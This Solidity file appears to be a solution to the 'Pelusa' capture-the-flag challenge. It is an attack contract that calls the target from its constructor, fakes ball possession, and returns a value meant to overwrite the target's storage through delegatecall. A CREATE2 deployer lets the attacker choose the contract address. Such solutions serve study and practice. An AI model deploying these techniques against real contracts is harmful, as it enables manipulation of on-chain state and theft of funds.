// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";
import "@openzeppelin/contracts/utils/Create2.sol";

contract PelusaQuillAttack is IGame {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;
    PelusaQuill public p;

    constructor(address target, address _owner) {
        p = PelusaQuill(target);
        owner = _owner;
        p.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function handOfGod() public returns(bytes32 data) {
        uint256 d = 22_06_1986;
        goals = 2;
        return bytes32(d);
    }
}

contract PelusaQuillDeployer {
    function deploy(bytes memory initCode, bytes32 salt) public {
        Create2.deploy(0, salt, initCode);
    }
}